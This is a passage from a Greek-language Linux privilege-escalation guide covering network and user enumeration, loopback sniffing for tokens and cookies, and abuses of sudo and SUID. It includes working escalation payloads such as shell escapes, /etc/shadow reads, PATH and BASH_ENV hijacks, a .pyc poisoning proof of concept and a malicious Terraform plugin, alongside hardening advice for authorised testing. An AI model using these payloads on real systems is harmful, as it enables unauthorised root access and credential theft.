#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Αν μια ενεργή καταχώριση στο `/etc/inetd.conf` εκτελεί το GNU Inetutils `telnetd` ως root, ελέγξτε την έκδοση του διαμορφωμένου δυαδικού αρχείου και τον τοπικό listener, ακόμη κι αν η θύρα είναι δεσμευμένη μόνο στη loopback. Οι εκδόσεις GNU Inetutils 1.9.3 έως 2.7 είχαν ένα [bypass αυθεντικοποίησης στο telnet](https://seclists.org/oss-sec/2026/q1/89), μέσω του οποίου το `USER` που παρείχε ο client έφτανε στο `login -f` (CVE-2026-24061). Μια διεργασία ή μια συμβολοσειρά έκδοσης αποτελεί ένδειξη· επιβεβαιώστε την κατάσταση των patches του προμηθευτή και τον πραγματικό daemon πριν θεωρήσετε ότι είναι εκτεθειμένος. Ο [οδηγός Telnet](../../../network-services-pentesting/pentesting-telnet.md) περιέχει περισσότερες λεπτομέρειες.

### Γρήγορη αρχική διαλογή φιλτραρίσματος εξερχόμενης κίνησης

Αν ο host μπορεί να εκτελεί εντολές, αλλά αποτυγχάνουν τα callbacks, ελέγξτε γρήγορα ξεχωριστά το φιλτράρισμα DNS, μεταφοράς, proxy και δρομολόγησης:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Ανοιχτές θύρες

Ελέγχετε πάντα τις υπηρεσίες δικτύου που εκτελούνται στο μηχάνημα και με τις οποίες δεν μπορέσατε να αλληλεπιδράσετε πριν αποκτήσετε πρόσβαση σε αυτό:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Ταξινομήστε τους listeners ανάλογα με τον στόχο bind:

- `0.0.0.0` / `[::]`: εκτεθειμένοι σε όλες τις τοπικές διεπαφές.
- `127.0.0.1` / `::1`: μόνο τοπικά (καλοί υποψήφιοι για tunnel/forward).
- Συγκεκριμένες εσωτερικές IP (π.χ. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): συνήθως προσβάσιμες μόνο από εσωτερικά segments.

### Ροή εργασίας triage για υπηρεσίες μόνο τοπικής πρόσβασης

Όταν αποκτάτε πρόσβαση σε έναν host, οι υπηρεσίες που είναι συνδεδεμένες στο `127.0.0.1` συχνά γίνονται προσβάσιμες για πρώτη φορά από το shell σας. Μια γρήγορη τοπική ροή εργασίας είναι:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS ως σαρωτής δικτύου (λειτουργία μόνο για δίκτυο)

Εκτός από τους τοπικούς ελέγχους PE, το linPEAS μπορεί να εκτελεστεί ως εξειδικευμένος σαρωτής δικτύου. Χρησιμοποιεί τα διαθέσιμα binaries στο `$PATH` (συνήθως `fping`, `ping`, `nc`, `ncat`) και δεν εγκαθιστά εργαλεία.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Αν περάσετε τα `-d`, `-p` ή `-i` χωρίς το `-t`, το linPEAS λειτουργεί αποκλειστικά ως σαρωτής δικτύου (παραλείποντας τους υπόλοιπους ελέγχους κλιμάκωσης προνομίων).

### Υποκλοπή πακέτων

Ελέγξτε αν μπορείτε να υποκλέψετε κίνηση δικτύου. Αν μπορείτε, ίσως καταφέρετε να αποκτήσετε διαπιστευτήρια.

```
timeout 1 tcpdump
```

Γρήγοροι πρακτικοί έλεγχοι:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Το Loopback (`lo`) είναι ιδιαίτερα πολύτιμο στο post-exploitation, επειδή πολλές υπηρεσίες που είναι προσβάσιμες μόνο εσωτερικά εκθέτουν εκεί tokens/cookies/credentials:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Συλλέξτε τώρα, αναλύστε αργότερα:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Χρήστες

### Γενική απαρίθμηση

Ελέγξτε **ποιος** είστε, ποια **δικαιώματα** έχετε, ποιοι **χρήστες** υπάρχουν στα συστήματα, ποιοι μπορούν να κάνουν **login** και ποιοι έχουν **δικαιώματα root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Μεγάλο UID

Ορισμένες εκδόσεις Linux επηρεάζονταν από ένα bug που επιτρέπει σε χρήστες με **UID > INT_MAX** να κάνουν privilege escalation. Περισσότερες πληροφορίες: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) και [here](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Κάντε exploit** χρησιμοποιώντας: **`systemd-run -t /bin/bash`**

### Ομάδες

Ελέγξτε αν είστε **μέλος κάποιας ομάδας** που θα μπορούσε να σας δώσει root privileges:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Πρόχειρο

Ελέγξτε αν υπάρχει κάτι ενδιαφέρον στο πρόχειρο (αν είναι δυνατό).

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Πολιτική κωδικών πρόσβασης

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Γνωστοί κωδικοί πρόσβασης

Αν **γνωρίζετε κάποιον κωδικό πρόσβασης** του περιβάλλοντος, **δοκιμάστε να συνδεθείτε ως κάθε χρήστης** χρησιμοποιώντας τον.

### Su Brute

Αν δεν σας πειράζει να προκαλέσετε πολύ θόρυβο και υπάρχουν στον υπολογιστή τα binaries `su` και `timeout`, μπορείτε να δοκιμάσετε να κάνετε brute-force σε χρήστες χρησιμοποιώντας το [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
Το [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με την παράμετρο `-a` δοκιμάζει επίσης να κάνει brute-force σε χρήστες.

## Καταχρήσεις εγγράψιμου PATH

### $PATH

Αν διαπιστώσετε ότι μπορείτε να **γράψετε σε κάποιον φάκελο του $PATH**, ίσως μπορέσετε να κλιμακώσετε τα προνόμιά σας **δημιουργώντας ένα backdoor μέσα στον εγγράψιμο φάκελο**, με το όνομα κάποιας εντολής που πρόκειται να εκτελεστεί από διαφορετικό χρήστη (ιδανικά τον root) και η οποία **δεν φορτώνεται από φάκελο που προηγείται του εγγράψιμου φακέλου στο $PATH**.

### SUDO και SUID

Ενδέχεται να σας επιτρέπεται να εκτελέσετε κάποια εντολή χρησιμοποιώντας sudo ή να έχει το suid bit. Ελέγξτε το με:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Ορισμένες **απρόσμενες εντολές σάς επιτρέπουν να διαβάζετε ή/και να γράφετε αρχεία ή ακόμα και να εκτελείτε μια εντολή**.<sup>[[8]](#references)</sup> Για παράδειγμα:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Η διαμόρφωση του Sudo μπορεί να επιτρέπει σε έναν χρήστη να εκτελεί ορισμένες εντολές με τα δικαιώματα άλλου χρήστη χωρίς να γνωρίζει τον κωδικό πρόσβασης.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Σε αυτό το παράδειγμα, ο χρήστης `demo` μπορεί να εκτελέσει το `vim` ως `root`. Είναι πλέον παιχνιδάκι να αποκτήσει ένα shell προσθέτοντας ένα ssh key στον κατάλογο του root ή καλώντας το `sh`.

```
sudo vim -c '!sh'
```

### Ασύγκριση Bash χωρίς εισαγωγικά σε script sudo

Στο Bash, η δεξιά πλευρά του `[[ "$protected" == $candidate ]]` είναι ένα μοτίβο. Αν ένα script sudo με δυνατότητα εκτέλεσης ως root συμπληρώνει το `candidate` από αρχείο που ελέγχει ο καλών, μια τιμή όπως `prefix*` μπορεί να ταιριάξει με την αρχή μιας προστατευμένης συμβολοσειράς. Διαφορετικές διαδρομές επιτυχίας και σφάλματος μπορεί τότε να αποκαλύψουν ένα prefix oracle. Βάλτε τη δεξιά πλευρά σε εισαγωγικά (`[[ "$protected" == "$candidate" ]]`) όταν επιδιώκεται κυριολεκτική ισότητα. Εξετάστε τα πραγματικά ορίσματα sudo, την προέλευση των εισόδων και την παρατηρήσιμη συμπεριφορά των κλάδων πριν θεωρήσετε ότι μια σύγκριση χωρίς εισαγωγικά είναι εκμεταλλεύσιμη. Το [εγχειρίδιο GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) ορίζει αυτή τη συμπεριφορά των μοτίβων.

### Αρχεία έργου PrusaSlicer μέσω sudo

Μια απεριόριστη παραχώρηση sudo με δυνατότητα εκτέλεσης ως root για το `prusaslicer` ή το `prusa-slicer` χρήζει ελέγχου, αν ο καλών μπορεί να επιλέξει το έργο `.3mf` που θα υποβληθεί σε slicing. Ένα έργο μπορεί να περιέχει script μετεπεξεργασίας που εκτελείται κατά την εξαγωγή G-code· ειδικά διαμορφωμένα έργα θα μπορούσαν να εκτελέσουν εντολές μέσω του PrusaSlicer έως και την έκδοση 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Επιβεβαιώστε τον ενεργό κανόνα sudo, την έκδοση του binary και τις διορθώσεις του προμηθευτή, την προέλευση του έργου και αν η σχετική διαδρομή εξαγωγής εκτελείται, πριν καταλήξετε ότι είναι προσβάσιμο το όριο προνομίων. Ένα σταθερό όρισμα έργου ή μια ενεργή πολιτική `NOEXEC` μπορεί να αλλάξει το αποτέλεσμα. Το ότι απλώς είναι εγκατεστημένος ο slicer δεν αποδεικνύει διαδρομή κλιμάκωσης προνομίων.

### SETENV

Αυτή η οδηγία επιτρέπει στον χρήστη να **ορίσει μια μεταβλητή περιβάλλοντος** κατά την εκτέλεση κάποιου προγράμματος:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Αυτό το παράδειγμα, **βασισμένο στο μηχάνημα Admirer του HTB**, ήταν **ευάλωτο** σε **PYTHONPATH hijacking**, επιτρέποντας τη φόρτωση αυθαίρετης βιβλιοθήκης Python κατά την εκτέλεση του script ως root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Poisoning εγγράψιμου `__pycache__` / `.pyc` σε εισαγωγές Python που επιτρέπονται από το sudo

Αν ένα **script Python που επιτρέπεται από το sudo** εισάγει ένα module του οποίου ο κατάλογος package περιέχει ένα **εγγράψιμο `__pycache__`**, ίσως μπορέσετε να αντικαταστήσετε το αποθηκευμένο `.pyc` και να εκτελέσετε κώδικα ως προνομιούχος χρήστης στην επόμενη εισαγωγή.<sup>[[30]](#references)</sup>

- Γιατί λειτουργεί:
  - Το CPython αποθηκεύει τα bytecode caches στο `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Ο interpreter επικυρώνει την **κεφαλίδα** (magic + μεταδεδομένα timestamp/hash που συνδέονται με τον πηγαίο κώδικα) και έπειτα εκτελεί το marshaled code object που βρίσκεται μετά από αυτήν.
  - Αν μπορείτε να **διαγράψετε και να δημιουργήσετε ξανά** το αποθηκευμένο αρχείο επειδή ο κατάλογος είναι εγγράψιμος, μπορείτε να αντικαταστήσετε ένα `.pyc` που ανήκει στον root αλλά δεν είναι εγγράψιμο.
- Συνήθης διαδρομή:
  - Το `sudo -l` εμφανίζει ένα script ή wrapper Python που μπορείτε να εκτελέσετε ως root.
  - Αυτό το script εισάγει ένα τοπικό module από το `/opt/app/`, το `/usr/local/lib/...` κ.λπ.
  - Ο κατάλογος `__pycache__` του module που εισάγεται είναι εγγράψιμος από τον χρήστη σας ή από όλους.

Γρήγορη απαρίθμηση:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Αν μπορείτε να εξετάσετε το προνομιούχο script, εντοπίστε τα εισαγόμενα modules και τη διαδρομή cache:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Ροή κατάχρησης:

1. Εκτελέστε μία φορά το script που επιτρέπεται μέσω sudo, ώστε η Python να δημιουργήσει το νόμιμο αρχείο cache, αν δεν υπάρχει ήδη.
2. Διαβάστε τα πρώτα 16 bytes από το νόμιμο `.pyc` και χρησιμοποιήστε τα ξανά στο poisoned αρχείο.
3. Μεταγλωττίστε ένα payload code object, εφαρμόστε `marshal.dumps(...)`, διαγράψτε το αρχικό αρχείο cache και δημιουργήστε το ξανά με την αρχική επικεφαλίδα και το κακόβουλο bytecode.
4. Εκτελέστε ξανά το script που επιτρέπεται μέσω sudo, ώστε το import να εκτελέσει το payload ως root.

Σημαντικές σημειώσεις:

- Η επαναχρησιμοποίηση της αρχικής επικεφαλίδας είναι καθοριστική, επειδή η Python ελέγχει τα metadata του cache σε σχέση με το αρχείο πηγαίου κώδικα, όχι αν το σώμα του bytecode αντιστοιχεί πραγματικά στον πηγαίο κώδικα.
- Αυτό είναι ιδιαίτερα χρήσιμο όταν το αρχείο πηγαίου κώδικα ανήκει στον root και δεν είναι εγγράψιμο, αλλά ο φάκελος `__pycache__` που το περιέχει είναι εγγράψιμος.
- Τα `PYTHONDONTWRITEBYTECODE=1` και `python -B` εμποδίζουν την Python να γράφει νέα αρχεία `.pyc`· **δεν** την εμποδίζουν να φορτώσει ένα ήδη έγκυρο cache που έχει αντικατασταθεί από attacker. Το κρίσιμο όριο είναι αν ένας χρήστης με λιγότερα προνόμια μπορεί να αντικαταστήσει ένα cache που θα αποδεχτεί το προνομιούχο import. Η Python ελέγχει τα metadata timestamp/size ή hash πριν φορτώσει αποθηκευμένο bytecode. Δείτε την [αναφορά import της Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) και την [τεκμηρίωση γραμμής εντολών](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Ελάχιστη μορφή proof-of-concept:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Σκλήρυνση:

- Βεβαιωθείτε ότι κανένας κατάλογος στη διαδρομή εισαγωγής Python με προνόμια δεν είναι εγγράψιμος από χρήστες με χαμηλά προνόμια, συμπεριλαμβανομένου του `__pycache__`.
- Ελέγξτε την ιδιοκτησία και τα δικαιώματα των καταλόγων cache, συμπεριλαμβανομένων των υπαρχόντων αρχείων `.pyc`. Η απενεργοποίηση της εγγραφής bytecode μπορεί να περιορίσει τη δημιουργία νέων cache, αλλά δεν εξουδετερώνει μια υπάρχουσα cache που μπορεί να αντικατασταθεί.
- Αντιμετωπίστε τα εγγράψιμα τοπικά modules Python και τους εγγράψιμους καταλόγους cache όπως θα αντιμετωπίζατε τα εγγράψιμα shell scripts ή τις shared libraries που εκτελούνται από τον root.

### Διατήρηση του BASH_ENV μέσω sudo env_keep → shell root

Αν το sudoers διατηρεί το `BASH_ENV` (π.χ., `Defaults env_keep+="ENV BASH_ENV"`), μπορείτε να αξιοποιήσετε τη συμπεριφορά εκκίνησης του Bash για μη διαδραστικές διεργασίες, ώστε να εκτελέσετε αυθαίρετο κώδικα ως root κατά την εκτέλεση μιας επιτρεπόμενης εντολής.<sup>[[24]](#references)</sup>

- Γιατί λειτουργεί: Στα μη διαδραστικά shells, το Bash αξιολογεί το `$BASH_ENV` και κάνει source αυτό το αρχείο πριν εκτελέσει το script-στόχο. Πολλοί κανόνες sudo επιτρέπουν την εκτέλεση ενός script ή ενός shell wrapper. Αν το `BASH_ENV` διατηρείται από το sudo, το αρχείο σας γίνεται source με προνόμια root.<sup>[[23]](#references)</sup>

- Απαιτήσεις:
  - Ένας κανόνας sudo που μπορείτε να εκτελέσετε (οποιοσδήποτε στόχος που εκκινεί το `/bin/bash` σε μη διαδραστική λειτουργία ή οποιοδήποτε bash script).
  - Το `BASH_ENV` να περιλαμβάνεται στο `env_keep` (ελέγξτε με `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Σκλήρυνση:
  - Αφαιρέστε τα `BASH_ENV` (και `ENV`) από το `env_keep` και προτιμήστε το `env_reset`.
  - Αποφύγετε τα shell wrappers για εντολές που επιτρέπονται μέσω sudo· χρησιμοποιήστε ελάχιστα binaries.
  - Εξετάστε το ενδεχόμενο καταγραφής I/O του sudo και ειδοποιήσεων όταν χρησιμοποιούνται διατηρημένες μεταβλητές περιβάλλοντος.

### Terraform μέσω sudo με διατηρημένο το HOME (!env_reset)

Όταν το sudo επιτρέπει την εκτέλεση του Terraform ως χρήστη με περισσότερα προνόμια, το `!env_reset` είναι ένδειξη για να ελέγξετε ποιες μεταβλητές περιβάλλοντος διατηρούνται πράγματι από τον συγκεκριμένο κανόνα. Επιβεβαιώστε την αποτελεσματική τιμή του `HOME` ή του `TF_CLI_CONFIG_FILE` προτού θεωρήσετε ενεργή τη διαμόρφωση CLI από ένα `.terraformrc` ή `terraform.rc` που μπορεί να τροποποιήσει ο καλών. Μια καταχώριση `provider_installation.dev_overrides` έχει σημασία μόνο αν η σταθερή εντολή Terraform φορτώνει αυτόν τον provider και ο καλών μπορεί να τοποθετήσει το εκτελέσιμό του στον επιλεγμένο κατάλογο.<sup>[[25]](#references)</sup>

- Κατευθύνετε τον απαιτούμενο provider σε έναν εγγράψιμο κατάλογο και τοποθετήστε ένα κακόβουλο plugin με όνομα ίδιο με αυτό του provider (π.χ., `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Το Terraform θα αποτύχει στο handshake του Go plugin, αλλά θα εκτελέσει το payload ως root πριν τερματιστεί, αφήνοντας πίσω ένα SUID shell.

### TF_VAR overrides + παράκαμψη ελέγχου symlink

Οι μεταβλητές Terraform μπορούν να δοθούν μέσω μεταβλητών περιβάλλοντος `TF_VAR_<name>`, αν ο συγκεκριμένος κανόνας sudo τις διατηρεί. Για ανάγνωση μέσω symlink πηγής χρειάζεται επίσης ένας provider που ακολουθεί τον σύνδεσμο και αντιγράφει το προστατευμένο αποτέλεσμα σε προορισμό αναγνώσιμο από τον caller. Η εγγραφή μέσω symlink προορισμού απαιτεί ξεχωριστά μια εγγραφή προορισμού υπό τον έλεγχο του caller και έναν προνομιούχο provider που ακολουθεί τον σύνδεσμο κατά την εγγραφή· μια μεταγενέστερη scheduled job είναι μόνο μία πιθανή συνέπεια. Επιθεωρήστε την ακριβή παραχώρηση sudo, τα σχετικά αρχεία `.tf`, την επιλεγμένη ρύθμιση CLI και την ιδιοκτησία των διαδρομών με εντολές μόνο για ανάγνωση, όπως `sudo -l`, `stat` και `readlink`, πριν δοκιμάσετε οποιαδήποτε από τις δύο διαδρομές. Αδύναμοι λεξικοί έλεγχοι, όπως `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, δεν επιλύουν τα symlink:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Το Terraform επιλύει το symlink και αντιγράφει το πραγματικό `/root/root.txt` σε έναν προορισμό αναγνώσιμο από τον attacker. Η ίδια προσέγγιση μπορεί να χρησιμοποιηθεί για **εγγραφή** σε προνομιούχες διαδρομές, δημιουργώντας εκ των προτέρων symlinks στον προορισμό (π.χ., δείχνοντας τη διαδρομή προορισμού του provider μέσα στο `/etc/cron.d/`).

### requiretty / !requiretty

Σε ορισμένες παλαιότερες διανομές, το sudo μπορεί να ρυθμιστεί με `requiretty`, το οποίο αναγκάζει το sudo να εκτελείται μόνο από ένα διαδραστικό TTY. Αν έχει οριστεί το `!requiretty` (ή αν η επιλογή απουσιάζει), το sudo μπορεί να εκτελεστεί από μη διαδραστικά περιβάλλοντα, όπως reverse shells, cron jobs ή scripts.

```bash
Defaults !requiretty
```

Αυτό δεν αποτελεί από μόνο του άμεση ευπάθεια, αλλά διευρύνει τις περιπτώσεις στις οποίες μπορούν να γίνει κατάχρηση κανόνων sudo χωρίς να απαιτείται πλήρες PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Αν το `sudo -l` εμφανίζει `env_keep+=PATH` ή ένα `secure_path` που περιλαμβάνει καταχωρίσεις στις οποίες μπορεί να γράψει ο επιτιθέμενος (π.χ., `/home/<user>/bin`), μπορεί να γίνει shadowing μιας εξωτερικής εντολής χωρίς πλήρη διαδρομή, η οποία καλείται μέσα στον στόχο που επιτρέπεται μέσω sudo.<sup>[[3]](#references)</sup> Η απουσία ενεργού `secure_path` αξίζει επίσης να εξεταστεί **αν** το περιβάλλον sudo της εντολής διατηρεί ένα `PATH` που ελέγχεται από τον καλούντα· η απουσία του από μόνη της δεν αποδεικνύει κάτι τέτοιο. Διαβάστε το επιτρεπόμενο script χωρίς να το εκτελέσετε και, στη συνέχεια, επαληθεύστε τον ακριβή κανόνα RunAs και ορισμάτων, την ενεργή διαδρομή αναζήτησης εντολών και την ύπαρξη ενός νωρίτερα αναζητούμενου καταλόγου στον οποίο μπορεί να γράψει ο επιτιθέμενος και να έχει πρόσβαση, που περιέχει το όνομα της εντολής. Η αυθεντικοποίηση, το `NOEXEC`, τα ενσωματωμένα κελύφους και οι απόλυτες διαδρομές εντολών μπορούν να αλλάξουν το αποτέλεσμα.

- Απαιτήσεις: ένας κανόνας sudo (συχνά `NOPASSWD`) που εκτελεί ένα script/binary το οποίο καλεί εντολές χωρίς απόλυτες διαδρομές (`free`, `df`, `ps` κ.λπ.) και μια εγγράψιμη καταχώριση PATH που αναζητείται πρώτη.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Παράκαμψη διαδρομών κατά την εκτέλεση μέσω Sudo
**Μεταπήδηση** για ανάγνωση άλλων αρχείων ή χρήση **symlinks**. Για παράδειγμα, στο αρχείο sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Αν χρησιμοποιείται ένα **wildcard** (\*), είναι ακόμα πιο εύκολο:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Αντίμετρα**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Εντολή Sudo/δυαδικό SUID χωρίς διαδρομή εντολής

Αν δοθεί **δικαίωμα sudo** για μία μόνο εντολή **χωρίς να καθορίζεται η διαδρομή**: _hacker10 ALL= (root) less_, μπορείς να το κάνεις exploit αλλάζοντας τη μεταβλητή PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί αν ένα **suid** binary **εκτελεί άλλη εντολή χωρίς να καθορίζει τη διαδρομή προς αυτήν (να ελέγχετε πάντα με** _**strings**_ **το περιεχόμενο ενός ύποπτου SUID binary)**.

[Παραδείγματα payload προς εκτέλεση.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID binary με διαδρομή εντολής

Αν το **suid** binary **εκτελεί άλλη εντολή καθορίζοντας τη διαδρομή**, τότε μπορείτε να δοκιμάσετε να **εξαγάγετε μια συνάρτηση** με όνομα ίδιο με την εντολή που καλεί το αρχείο suid.

Για παράδειγμα, αν ένα suid binary καλεί το _**/usr/sbin/service apache2 start**_, πρέπει να δοκιμάσετε να δημιουργήσετε και να εξαγάγετε τη συνάρτηση:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Έπειτα, όταν καλέσετε το SUID binary, θα εκτελεστεί αυτή η συνάρτηση

### Προσαρμοσμένα SUID copy wrappers

Ένα SUID utility που ανήκει στον root και δέχεται paths προέλευσης και προορισμού μπορεί να διασχίσει δύο διαφορετικά όρια εμπιστοσύνης. Αν δημιουργεί shell command από κάποιο από τα ορίσματα (για παράδειγμα, περνώντας ένα command `cp` που έχει κατασκευάσει στη `system()`), οι shell metacharacters μπορεί να εκτελέσουν άλλο command με τα effective privileges του. Ακόμη κι αν καλεί το `cp` με ασφαλή τρόπο, χωρίς shell, ένας μη περιορισμένος προορισμός μπορεί να επιτρέψει αυθαίρετη εγγραφή με αυξημένα privileges σε αρχεία όπως το `/etc/passwd`. Ελέγξτε τον χειρισμό των ορισμάτων από το wrapper, τη συμπεριφορά του effective UID, τους περιορισμούς προορισμού και το αν το αρχείο που αντιγράφεται διατηρεί περιεχόμενο που ελέγχεται από τον caller· ένα γενικό σφάλμα του `cp` ή το SUID bit από μόνο του δεν αποδεικνύει ότι ισχύει το ένα ή το άλλο. Καταγράψτε το binary και τα permissions του παθητικά πριν από οποιαδήποτε χειροκίνητη δοκιμή.

### Script με δικαίωμα εγγραφής που εκτελείται από SUID wrapper

Μια συνηθισμένη λανθασμένη ρύθμιση σε custom εφαρμογές είναι ένα SUID binary wrapper που ανήκει στον root και εκτελεί ένα script, ενώ το ίδιο το script είναι εγγράψιμο από χρήστες με χαμηλά privileges.

Τυπικό μοτίβο:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Αν το `/usr/local/bin/backup.sh` είναι εγγράψιμο, μπορείτε να προσθέσετε εντολές payload και στη συνέχεια να εκτελέσετε το SUID wrapper:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Γρήγοροι έλεγχοι:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
